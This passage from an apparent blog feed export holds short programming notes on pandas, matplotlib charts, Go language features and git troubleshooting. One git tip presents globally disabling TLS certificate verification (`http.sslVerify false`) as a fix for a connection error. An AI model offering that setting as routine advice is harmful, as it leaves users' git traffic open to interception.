class="line">2  7  8  9</span><br><span class="line"></span><br><span class="line">In [25]: df3 = pd.DataFrame(data, index=[&quot;a&quot;, &quot;b&quot;, &quot;c&quot;])</span><br><span class="line"></span><br><span class="line">In [26]: df3</span><br><span class="line">Out[26]:</span><br><span class="line">   0  1  2</span><br><span class="line">a  1  2  3</span><br><span class="line">b  4  5  6</span><br><span class="line">c  7  8  9</span><br></pre></td></tr></table></figure><h2 id="viewnig-data">viewnig Data</h2><ul><li><code>df.head(5)</code>：默认返回前五行</li><li><code>df.tail(5)</code>：默认返回后五行</li><li><code>df.index</code>：返回该 DataFrame 的索引</li><li><code>df.columns</code>：返回该 DataFrame 的列</li><li><code>df.T</code>：返回该 DataFrame 的转置</li><li><code>df.to_numpy()</code>：返回该 DataFrame 的矩阵表示</li><li><code>df.describe()</code>： 返回该 DataFrame 的描述与统计信息</li></ul><h2 id="参考">参考</h2><ol type="1"><li><p><ahref="https://pandas.pydata.org/docs/reference/api/pandas.DataFrame.html">pandas.DataFrame— pandas 1.4.2 documentation</a></p></li><li><p><ahref="https://www.kaggle.com/code/residentmario/creating-reading-and-writing">Creating,Reading and Writing | Kaggle</a></p></li><li><p><ahref="https://stackoverflow.com/questions/16923281/writing-a-pandas-dataframe-to-csv-file">python- Writing a pandas DataFrame to CSV file - Stack Overflow</a></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ml </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>matplotlib 库之散点图、折线图和柱状图</title>
      <link href="/blog/2022/05/15/programming/python/ai/plot_graphs/"/>
      <url>/blog/2022/05/15/programming/python/ai/plot_graphs/</url>
      
        <content type="html"><![CDATA[<h1 id="matplotlib-库之散点图折线图和柱状图">matplotlib库之散点图、折线图和柱状图</h1><h2 id="散点图">散点图</h2><p>散点图（Scatter）：是数据点在直角坐标系中的分布图，它可以传递：</p><ol type="1"><li>原始数据分布的规律</li><li>数据变化的趋势</li><li>数据分组情况</li></ol><p><code>scatter()</code> 函数 scatter(x,y,scale,color,marker,label),其中 x，y 为 python 列表或者 numpy 数组。</p><table><thead><tr class="header"><th>参数</th><th>说明</th><th>默认值</th></tr></thead><tbody><tr class="odd"><td>X</td><td>数据点的 x 坐标</td><td>不可省略</td></tr><tr class="even"><td>y</td><td>数据点的 y 坐标</td><td>不可省略</td></tr><tr class="odd"><td>scale</td><td>数据点的大小</td><td>36</td></tr><tr class="even"><td>color</td><td>数据点的颜色</td><td></td></tr><tr class="odd"><td>marker</td><td>数据点的样式</td><td>'o'(圆点)</td></tr><tr class="even"><td>label</td><td>图例文字</td><td></td></tr></tbody></table><p><code>text(x, y, s, fontsize, color)</code></p><table><thead><tr class="header"><th>参数</th><th>说明</th><th>默认值</th></tr></thead><tbody><tr class="odd"><td>x</td><td>文字的 x 坐标</td><td>不可省略</td></tr><tr class="even"><td>y</td><td>文字的 y 坐标</td><td>不可省略</td></tr><tr class="odd"><td>s</td><td>显示的文字</td><td>不可省略</td></tr><tr class="even"><td>fontsize</td><td>文字的大小</td><td>12</td></tr><tr class="odd"><td>color</td><td>文字的颜色</td><td>黑色</td></tr></tbody></table><h2 id="坐标轴设置">坐标轴设置</h2><p>坐标原点在中间，两个轴上都有正的和负的部分，在设置字体为中文字体后，坐标轴上的符号可能会出错。<code>plt.rcParams["axes.unicode_minus"] = False</code></p><table><thead><tr class="header"><th>函数</th><th>说明</th></tr></thead><tbody><tr class="odd"><td>xlabel(x, y, s, fontsize, color)</td><td>设置 x 轴标签</td></tr><tr class="even"><td>ylabel( x, y, s, fontsize, color)</td><td>设置 y 轴标签</td></tr><tr class="odd"><td>xlim(xmin, xmax)</td><td>设置 x 轴坐标的范围</td></tr><tr class="even"><td>ylim(ymin, ymax)</td><td>设置 y 轴坐标的范围</td></tr><tr class="odd"><td>tick params(labelsize)</td><td>设置刻度文字的字号</td></tr></tbody></table><h2 id="增加图例">增加图例</h2><p>scatter(x, y, scale, color, marker, label) legend(loc, fontsize)</p><table><thead><tr class="header"><th>取值</th><th>图例位置</th><th>取值</th><th>图例位置</th></tr></thead><tbody><tr class="odd"><td>0</td><td>best</td><td>6</td><td>center left</td></tr><tr class="even"><td></td><td>upper right</td><td>7</td><td>center right</td></tr><tr class="odd"><td>2</td><td>upper left</td><td>8</td><td>lower center</td></tr><tr class="even"><td>3</td><td>lower left</td><td>9</td><td>upper center</td></tr><tr class="odd"><td>4</td><td>lower right</td><td>10</td><td>center</td></tr><tr class="even"><td>5</td><td>right</td><td></td><td></td></tr></tbody></table><h2 id="折线图">折线图</h2><p>折线图（Line Chart）：散点图的基础上，将相邻的点用线段相连接描述变量变化的趋势</p><p>plot(x, y, color, marker, label, linewidth, markersize)</p><table><thead><tr class="header"><th>参数</th><th>说明</th><th>默认值</th></tr></thead><tbody><tr class="odd"><td>x</td><td>数据点的 x 坐标</td><td>0,1,2....</td></tr><tr class="even"><td>y</td><td>数据点的 y 坐标</td><td>不可省略</td></tr><tr class="odd"><td>color</td><td>数据点的颜色</td><td></td></tr><tr class="even"><td>marker</td><td>数据点的样式</td><td>'o'(圆点)</td></tr><tr class="odd"><td>label</td><td>图例文字</td><td></td></tr><tr class="even"><td>linewidth</td><td>折线的宽度</td><td></td></tr><tr class="odd"><td>markersize</td><td>数据点的大小</td><td></td></tr></tbody></table><p>系统自动地给多条折线设置不同的颜色。</p><h2 id="柱状图">柱状图</h2><p>柱状图 (Bar Chart) ：由一系列高度不等的柱形条纹表示数据分布的情况。bar(left, height, width=0.8, facecolor, edgecolor, label)left：每柱的左边的 x 坐标 height：每柱的高度 y 坐标</p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Go 断言</title>
      <link href="/blog/2022/03/26/programming/go/go_type_assertion/"/>
      <url>/blog/2022/03/26/programming/go/go_type_assertion/</url>
      
        <content type="html"><![CDATA[<ul><li>只要实现了接口的全部方法认为这个类型属于接口类型,如果编写一个接口,这个接口中没有任何方法,这时认为所有类型都实现了这个接口.所以Go 语言中<code>interface&#123;&#125;</code>代表任意类型</li><li>如果<code>interface&#123;&#125;</code>作为方法参数就可以接收任意类型,但是在程序中有时有需要知道这个参数到底是什么类型,这个时候就需要使用断言</li><li>断言使用时使用 interface{}变量点括号,括号中判断是否属于的类型</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">i <span class="keyword">interface</span>&#123;&#125;</span><br><span class="line">i.(Type)</span><br></pre></td></tr></table></figure><ul><li>断言的两大作用:<ul><li>判断是否是指定类型</li><li>把 interface{}转换为特定类型</li></ul></li></ul><h1 id="二.代码示例">二.代码示例</h1><ul><li>断言可以有一个返回值,如果判断结果是指定类型返回变量值,如果不是指定类型报错</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">demo</span><span class="params">(i <span class="keyword">interface</span>&#123;&#125;)</span></span>&#123;</span><br><span class="line">result:=i.(<span class="type">int</span>)</span><br><span class="line">fmt.Println(result)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">参数是456时,程序运行正常,输出:</span></span><br><span class="line"><span class="comment">456</span></span><br><span class="line"><span class="comment">参数是false时报错：</span></span><br><span class="line"><span class="comment">panic: interface conversion: interface &#123;&#125; is bool, not int</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">demo(<span class="number">456</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>断言也可以有两个返回值,这时无论是否是指定类型都不报错.<ul><li>第一个参数:<ul><li>如果正确:返回值变量值</li><li>如果错误:返回判断类型的默认值</li></ul></li><li>第二个参数:<ul><li>返回值为 bool 类型,true 表示正确,false 表示错误</li></ul></li></ul></li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">demo</span><span class="params">(i <span class="keyword">interface</span>&#123;&#125;)</span></span> &#123;</span><br><span class="line">result, ok := i.(<span class="type">int</span>)</span><br><span class="line">fmt.Println(result, ok)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">参数是456时,程序运行正常,输出:</span></span><br><span class="line"><span class="comment">456true</span></span><br><span class="line"><span class="comment">参数是字符串&quot;abc&quot;时程序运行正常,输出:</span></span><br><span class="line"><span class="comment">0 false</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">demo(<span class="string">&quot;abc&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Golang </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vscode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Interface in Golang</title>
      <link href="/blog/2022/03/19/programming/go/Interface/"/>
      <url>/blog/2022/03/19/programming/go/Interface/</url>
      
        <content type="html"><![CDATA[<h1 id="interface">Interface</h1><h2 id="interface-values-with-nil-underlying-values">Interface valueswith nil underlying values</h2><p>If the concrete value inside the interface itself is nil, the methodwill be called with a nil receiver.</p><p>In some languages this would trigger a null pointer exception, but inGo it is common to write methods that gracefully handle being calledwith a nil receiver (as with the method M in this example.)</p><p>Note that an interface value that holds a nil concrete value isitself non-nil.</p><h2 id="nil-interface-values">Nil interface values</h2><p>A nil interface value holds neither value nor concrete type.</p><p>Calling a method on a nil interface is a run-time error because thereis no type inside the interface tuple to indicate which concrete methodto call.</p><h2 id="type-assertions">Type assertions</h2><p>A type assertion provides access to an interface value's underlyingconcrete value.</p><p>To test whether an interface value holds a specific type, a typeassertion can return two values: the underlying value and a booleanvalue that reports whether the assertion succeeded.</p><p>t, ok := i.(T) If i holds a T, then t will be the underlying valueand ok will be true.</p><p>If not, ok will be false and t will be the zero value of type T, andno panic occurs.</p><p>Note the similarity between this syntax and that of reading from amap.</p>]]></content>
      
      
      <categories>
          
          <category> go </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Go 切片删除元素</title>
      <link href="/blog/2022/03/19/programming/go/go_slice/"/>
      <url>/blog/2022/03/19/programming/go/go_slice/</url>
      
        <content type="html"><![CDATA[<p>Go语言标准库中没有提供切片元素删除的函数，可以利用切片也可以取其中的一段形成子切片的特性来实现删除效果。</p><h2 id="原切片内容不变">原切片内容不变</h2><p>使用 copy 完成删除元素，可以保证原切片内容不变</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">num := []<span class="type">int</span>&#123;<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>&#125;</span><br><span class="line">n := <span class="number">2</span></span><br><span class="line">newSlice := <span class="built_in">make</span>([]<span class="type">int</span>, n)</span><br><span class="line"><span class="built_in">copy</span>(newSlice, num[:n])</span><br><span class="line">newSlice = <span class="built_in">append</span>(newSlice, num[n+<span class="number">1</span>:]...)</span><br><span class="line">fmt.Printf(<span class="string">&quot;num:%p, newSlice:%p\n&quot;</span>, num, newSlice)</span><br><span class="line">fmt.Printf(<span class="string">&quot;num:%v, newSlice:%v\n&quot;</span>, num, newSlice)</span><br></pre></td></tr></table></figure><h2 id="原切片内容改变">原切片内容改变</h2><p>原因 slice 是引用类型，传地址。append单纯将第二个参数地址的值复制连接到第一个参数尾部。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">num := []<span class="type">int</span> &#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>&#125;</span><br><span class="line"><span class="comment">//要删除脚标为n的元素</span></span><br><span class="line">n:= <span class="number">2</span></span><br><span class="line">num1 :=num[<span class="number">0</span>:n]</span><br><span class="line">num1= <span class="built_in">append</span>(num1,num[n+<span class="number">1</span>:]...)</span><br><span class="line">fmt.Println(num1)</span><br></pre></td></tr></table></figure><p>或</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">num := []<span class="type">int</span> &#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>&#125;</span><br><span class="line"><span class="comment">//要删除脚标为n的元素</span></span><br><span class="line">n:= <span class="number">2</span></span><br><span class="line">num1 :=<span class="built_in">append</span>(num[<span class="number">0</span>:n],num[n+<span class="number">1</span>:]...)</span><br><span class="line">fmt.Println(num1)</span><br></pre></td></tr></table></figure><p>注意： 不能在自己的切片上append，因为切片是引用，会导致后面的往相同内存上进行覆盖改变原切片的值。</p>]]></content>
      
      
      <categories>
          
          <category> Golang </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vscode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Go 闭包</title>
      <link href="/blog/2022/03/16/programming/go/go_%20closure/"/>
      <url>/blog/2022/03/16/programming/go/go_%20closure/</url>
      
        <content type="html"><![CDATA[<ul><li>闭包不是 Go 语言独有的概念,在很多编程语言中都有闭包</li><li>闭包就是解决局部变量不能被外部访问一种解决方案</li><li>是把函数当作返回值的一种应用</li></ul><h2 id="二.代码演示">二.代码演示</h2><ul><li>总体思想为:在函数内部定义局部变量,把另一个函数当作返回值,局部变量对于返回值函数就相当于全局变量,所以多次调用返回值函数局部变量的值跟随变化</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line">import &quot;fmt&quot;</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">//res其实就是test1返回值函数,和之前匿名函数变量一个道理</span><br><span class="line">res := test1()</span><br><span class="line">fmt.Println(res()) //输出2</span><br><span class="line">fmt.Println(res()) //输出3</span><br><span class="line">fmt.Println(res()) //输出4</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//注意此处,返回值类型是func int</span><br><span class="line">func test1() func() int &#123;</span><br><span class="line">i := 1</span><br><span class="line">return func() int &#123;</span><br><span class="line">i = i + 1</span><br><span class="line">return i</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>如果重新调用 test1()会重新声明及赋值局部变量 i</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line">import &quot;fmt&quot;</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">f := test1()</span><br><span class="line">fmt.Println(&quot;f的地址&quot;, f) //输出匿名函数地址</span><br><span class="line">fmt.Println(&quot;f:&quot;, f()) //调用匿名函数输出2</span><br><span class="line">fmt.Println(&quot;f:&quot;, f()) //调用匿名函数输出3</span><br><span class="line">k := test1()</span><br><span class="line">fmt.Println(&quot;k的地址&quot;, k) //输出匿名函数地址,与f相等</span><br><span class="line">fmt.Println(&quot;k:&quot;, k()) //调用匿名函数输出2</span><br><span class="line">fmt.Println(&quot;f:&quot;, f()) //输出:4</span><br><span class="line">fmt.Println(&quot;k:&quot;, k()) //输出:3</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func test1() func() int &#123;</span><br><span class="line">i := 1</span><br><span class="line">return func() int &#123;</span><br><span class="line">i++</span><br><span class="line">// 每调用一次test1()输出的地址不一样</span><br><span class="line">fmt.Println(&quot;i的地址:&quot;, &amp;i)</span><br><span class="line">return i</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Golang </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>从 GOPATH 到 Go modules</title>
      <link href="/blog/2022/02/26/programming/go/go_path_module/"/>
      <url>/blog/2022/02/26/programming/go/go_path_module/</url>
      
        <content type="html"><![CDATA[<p>为了解决 GOPATH 的问题，官方在 1.11 开始推出了 Go Modules的功能,将第三方库储存在本地的空间，并且给程序去引用。</p><p>首先要设定 <code>GO111MODULE</code>环境变量，总共可以三种不同的值：</p><ol type="1"><li>auto go 命令会根据当前目录来决定是否启用 modules 功能。需要满足两种情形：<ol type="1"><li>该项目目录不在 <code>GOPATH/src/</code> 下</li><li>当前或上一层目录存在 <code>go.mod</code></li></ol></li><li>on Go 1.16.6 的默认值，go 命令会使用 modules，而不会 GOPATH目录下查找。</li><li>off go 命令将不会支持 module 功能，寻找套件如以前 GOPATH的做法去寻找。</li></ol><p>官方与实践都推荐采用 Go Modules 的做法，不再使用 GOPATH的功能了，因此将其设定为 on。</p><p>Go Modules 方式下载下来的第三方库位在 <code>GOPATH/pkg/mod</code>文件夹里面。</p><h2 id="参考资料">参考资料</h2><blockquote><ol type="1"><li><ahref="https://medium.com/%E4%BC%81%E9%B5%9D%E4%B9%9F%E6%87%82%E7%A8%8B%E5%BC%8F%E8%A8%AD%E8%A8%88/golang-goroot-gopath-go-modules-%E4%B8%89%E8%80%85%E7%9A%84%E9%97%9C%E4%BF%82%E4%BB%8B%E7%B4%B9-d17481d7a655">Golang— GOROOT、GOPATH、Go-Modules-三者的关系介绍 | by 陈冠亿 Kenny |企鹅也懂编程 | Medium</a></li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> Golang </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Pointers to structs</title>
      <link href="/blog/2022/02/20/programming/go/point_struct/"/>
      <url>/blog/2022/02/20/programming/go/point_struct/</url>
      
        <content type="html"><![CDATA[<p>Struct fields can be accessed through a struct pointer.</p><p>To access the field X of a struct when we have the struct pointer pwe could write <code>(*p).X</code>. However, that notation iscumbersome, so the language permits us instead to write just p.X,without the explicit dereference.</p><h2 id="functions">functions</h2><p>Named return values Go's return values may be named. If so, they aretreated as variables defined at the top of the function.</p><h2 id="导出名">导出名</h2><p>Exported names: In Go, a name is exported if it begins with a capitalletter. For example, Pizza is an exported name, as is Pi, which isexported from the math package.</p><p>When importing a package, you can refer only to its exported names.Any "unexported" names are not accessible from outside the package.</p><h3 id="分号自动插入规则">分号自动插入规则</h3><p>注意使用 go.fmt进行格式化，按照语法格式写，否则会有意料之外的结果。</p><p><ahref="https://blog.csdn.net/s13335358730/article/details/103654224">Go语言小细节——分号自动插入规则_s13335358730 的博客-CSDN 博客</a></p>]]></content>
      
      
      <categories>
          
          <category> Golang </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Golang functions and methods</title>
      <link href="/blog/2022/02/16/programming/go/func_method/"/>
      <url>/blog/2022/02/16/programming/go/func_method/</url>
      
        <content type="html"><![CDATA[<p>You can only declare a method with a receiver whose type is definedin the same package as the method. You cannot declare a method with areceiver whose type is defined in another package (which includes thebuilt-in types such as int). 不能定义原生类型的方法，可以通过 type定义别名的方式来定义原生类型的方法。</p><h2 id="receiver">receiver</h2><p>带有值接收器的方法修改的是接收器的拷贝，带有指针接收器的方法才能修改该接收器本身的值。</p><p>Methods with pointer receivers can <strong>modify the value to whichthe receiver points</strong> (as Scale does here). Since methods oftenneed to modify their receiver, pointer receivers are more common thanvalue receivers.</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(v *Vertex)</span></span> Scale(f <span class="type">float64</span>) &#123;</span><br><span class="line">v.X = v.X * f</span><br><span class="line">v.Y = v.Y * f</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">v := Vertex&#123;<span class="number">3</span>, <span class="number">4</span>&#125;</span><br><span class="line">v.Scale(<span class="number">10</span>)</span><br><span class="line">fmt.Println(v.Abs())</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="function-and-methods">function and methods</h2><p>functions with a pointer argument must take a pointer，Functions thattake a value argument must take a value.</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> v Vertex</span><br><span class="line">ScaleFunc(v, <span class="number">5</span>)  <span class="comment">// Compile error!</span></span><br><span class="line">ScaleFunc(&amp;v, <span class="number">5</span>) <span class="comment">// OK</span></span><br></pre></td></tr></table></figure><p>while methods with pointer receivers take either a value or a pointeras the receiver when they are called. Methods with value receivers takeeither a value or a pointer as the receiver when they are called</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> v Vertex</span><br><span class="line">v.Scale(<span class="number">5</span>)  <span class="comment">// OK</span></span><br><span class="line">p := &amp;v</span><br><span class="line">p.Scale(<span class="number">10</span>) <span class="comment">// OK</span></span><br></pre></td></tr></table></figure><p>For the statement <code>v.Scale(5)</code>, eventhough <code>v</code> is a value and not a pointer, the method with thepointer receiver is called automatically. That is, as a convenience, Gointerprets thestatement <code>v.Scale(5)</code> as <code>(&amp;v).Scale(5)</code> sincethe <code>Scale</code> method has a pointer receiver.</p><h2 id="two-reasons-to-use-a-pointer-receiver.">Two reasons to use apointer receiver.</h2><p>The first is so that the method can modify the value that itsreceiver points to.</p><p>The second is to avoid copying the value on each method call. Thiscan be more efficient if the receiver is a large struct, forexample.</p>]]></content>
      
      
      <categories>
          
          <category> Golang </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>git 问题汇总</title>
      <link href="/blog/2022/02/16/linux/git/git_issues/"/>
      <url>/blog/2022/02/16/linux/git/git_issues/</url>
      
        <content type="html"><![CDATA[<h2 id="how-to-uncommit">How to uncommit</h2><p>In the simplest terms: <code>git reset --soft comm_hash_id</code>,comm_hash_id 通过 git log 查看,也可以使用 <code>HEAD</code>,<code>HEAD^</code> 来快捷代替</p><p><code>--soft</code>: uncommit changes, <strong>changes are leftstaged</strong> (index). <code>--mixed</code> (default):<strong>uncommit + unstage</strong> changes, changes <strong>are left inworking tree</strong>. <code>--hard</code>: <strong>uncommit + unstage +delet</strong>e changes, nothing left.</p><h2 id="参考资料">参考资料</h2><ol type="1"><li><ahref="https://stackoverflow.com/questions/3528245/whats-the-difference-between-git-reset-mixed-soft-and-hard">versioncontrol - What's the difference between git reset --mixed, --soft, and--hard? - Stack Overflow</a></li><li><ahref="https://stackoverflow.com/questions/2845731/how-to-uncommit-my-last-commit-in-git">undo- How to uncommit my last commit in Git - Stack Overflow</a></li></ol><h2 id="使用-ssh-的方式进行-clone-或者-push-时报错">使用 ssh 的方式进行clone 或者 push 时报错</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh: connect to host github.com port 22: Connection refused</span><br><span class="line">fatal: Could not read from remote repository.</span><br><span class="line">Please make sure you have the correct access rights and the repository exists.</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">repository access denied.</span><br></pre></td></tr></table></figure><p>原因：在没有配置 ssh 密钥的情况下，使用 ssh协议克隆仓库是不可行的，</p><p>解决办法：</p><ol type="1"><li>改用 https 协议的链接克隆仓库</li><li>配置 ssh 密钥之后再使用 ssh 协议</li></ol><p>有时候 github 被屏蔽，也会有这种类似报错，ssh 被阻断了，挂梯子</p><h2 id="git-将默认分支由-master-改为了-main导致报错">Git 将默认分支由master 改为了 main，导致报错</h2><p>github 在 2020/10/1宣布所有新库都将用中性词「main」命名,取代原来的「master」</p><p>最新 git 建仓库并习惯性使用 master 来 push 的时候，报错：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">error: src refspec master does not match any</span><br><span class="line">error: failed to push some refs to &#x27;https://github.com/realyee/codesnippet.git&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>解决方法：</p><ol type="1"><li><p>将分支 check out 到 master，然后 push</p><p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git checkout -b master</span><br><span class="line">git push origin master</span><br></pre></td></tr></table></figure></p></li><li><p>不指名当前分支，只说将 local red HEAD 推送到远端的 master</p><p><code>git push origin HEAD:master</code></p></li></ol><h3 id="参考资料-1">参考资料</h3><ol type="1"><li><ahref="https://stackoverflow.com/questions/4181861/message-src-refspec-master-does-not-match-any-when-pushing-commits-in-git">Message'src refspec master does not match any' when pushing commits in Git -Stack Overflow</a></li></ol><h2 id="git-push-gnutls-recv-error--110-the-tls-报错">git push GnuTLSrecv error (-110): The TLS 报错</h2><p>this solution below worked for me</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apt-get install gnutls-bin</span><br><span class="line">git config --global http.sslVerify false</span><br><span class="line">git config --global http.postBuffer 1048576000</span><br></pre></td></tr></table></figure><p><a href="https://github.com/argoproj/argo-cd/issues/3994">GnuTLS recverror (-110): The TLS connection was non-properly terminated · Issue#3994 · argoproj/argo-cd · GitHub</a></p><h1id="go-getgit-libressl-ssl_connect-ssl_error_syscall-in-connection-to-github.com443">goget/git LibreSSL SSL_connect: SSL_ERROR_SYSCALL in connection togithub.com:443</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global --unset https.proxy</span><br><span class="line">git config --global --unset http.proxy</span><br></pre></td></tr></table></figure><h2 id="git-push-require-username-password">git push require usernamepassword</h2><p>A common cause is cloning using the default (HTTPS) instead of SSH.You can correct this by going to your repository, clicking "Clone ordownload", then clicking the "Use SSH" button above the URL field andupdating the URL of your origin remote like this:</p><p><code>git remote set-url origin git@github.com:username/repo.git</code></p><p>You can check if you have added the remote as HTTPS or SSH using:</p><p><code>git remote -v</code></p><p>注意：clone 的时候使用 https 还是 ssh 是有区别的。 clone 自己的仓库用ssh， clone 别人的仓库用 https，因为权限不同， clone 自己仓库的 https版本如果 push 的话需要提供用户名和密码，而 git现在版本不再支持该方式。</p><p>参考：<ahref="https://stackoverflow.com/questions/6565357/git-push-requires-username-and-password">github- Git push requires username and password - Stack Overflow</a></p><h2 id="ssh-访问-github-超时">ssh 访问 github 超时</h2><p><code>ssh: connect to host Build software better, together port 22: Connection timed out</code>在 fork 了别人的仓库，clone 到本地修改之后，push不上去了，本来以为网络或者代理问题，但搞了半天都不行，最后解决了：方法：Switching remote URLs from SSH to HTTPS，从 SSH 协议修改成了 HTTPS协议</p><p><ahref="https://docs.github.com/en/get-started/getting-started-with-git/managing-remote-repositories">Managingremote repositories - GitHub Docs</a></p>]]></content>
      
      
      <categories>
          
